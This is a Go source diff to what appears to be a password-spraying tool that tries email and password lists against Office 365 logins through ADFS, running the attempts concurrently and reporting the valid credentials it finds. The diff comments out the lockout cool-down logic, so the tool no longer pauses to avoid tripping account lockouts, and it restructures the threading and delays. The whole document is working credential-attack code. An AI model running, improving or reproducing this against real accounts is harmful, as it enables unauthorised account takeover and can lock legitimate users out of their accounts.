@@ -71,7 +71,6 @@ func SprayADFSO365(
 }
 
 
-//TODO multithreading
 func SprayEmailsADFSO365(
 	domainName string,
 	authURL string,
@@ -85,17 +84,6 @@ func SprayEmailsADFSO365(
 	maxLockouts int,
 	threads int,
 ) {
-
-	semaphore := make(chan struct{}, threads)
-	var wg sync.WaitGroup
-	semaphore <- struct{}{}
-	wg.Add(1)
-	go func() {
-		defer func() {
-			<-semaphore
-			wg.Done()
-		}()
-
 	color.Yellow("[+] Spraying For O365 Emails - ADFS")
 	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
 	fileName := domainName + "_spray_" + timeStamp
@@ -212,7 +200,7 @@ func SprayEmailsADFSO365(
 				color.Red("[-] No Valid O365 Credentials Found !")
 			}
 		}
-		//passwords from file
+
 		if len(password) == 0 && len(passwordFilePath) > 0 {
 			lockoutCount := 0
 			passFile, err := os.Open(passwordFilePath)
@@ -222,41 +210,39 @@ func SprayEmailsADFSO365(
 			defer passFile.Close()
 			passScanner := bufio.NewScanner(passFile)
 
-			//multithreading
 			concurrentLimit := threads
 			sem := make(chan struct{}, concurrentLimit)
 			var wg sync.WaitGroup
 
 			for passScanner.Scan() {
-				if lockoutCount == (lockout - 1) && lockoutDelay != 0 {
-					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
-					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
-					lockoutCount = 1
-				}
-				lockoutCount += 1
+				//if lockoutCount == (lockout - 1) {
+				//	color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
+				//	time.Sleep(time.Duration(lockoutDelay) * time.Minute)
+				//	lockoutCount = 1
+				//}
+				//lockoutCount += 1
 				emailFile, err := os.Open(emailFilePath)
 				if err != nil {
 					log.Fatal(err)
 				}
 				defer emailFile.Close()
 				emailScanner := bufio.NewScanner(emailFile)
-
 				
+
 				for emailScanner.Scan() {
+
 					wg.Add(1)
 
 					go func(email string, password string) {
 						defer wg.Done()
-
 						sem <- struct{}{}
 						defer func() { <-sem }()
-
 						// Выполняем SprayADFSO365
 						SprayADFSO365(domainName, authURL, email, password, "file", logFile)
 						fmt.Printf("\rProgress: [%3s:%3d]", password, checkedUsers)
-						// Пауза
-						time.Sleep(time.Duration(delay))
 					}(emailScanner.Text(), passScanner.Text())
+
+					time.Sleep(time.Duration(delay))
 				}
 				if err := emailScanner.Err(); err != nil {
 					log.Fatal(err)
@@ -265,16 +251,15 @@ func SprayEmailsADFSO365(
 			if err := passScanner.Err(); err != nil {
 				log.Fatal(err)
 			}
+
 			wg.Wait()
+			
 			if sprayedUsers > 0 {
 				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
 			} else {
 				color.Red("[-] No Valid O365 Credentials Found !")
 			}
 		}
+
 	}
-
-	}()
-
-	wg.Wait()
 }
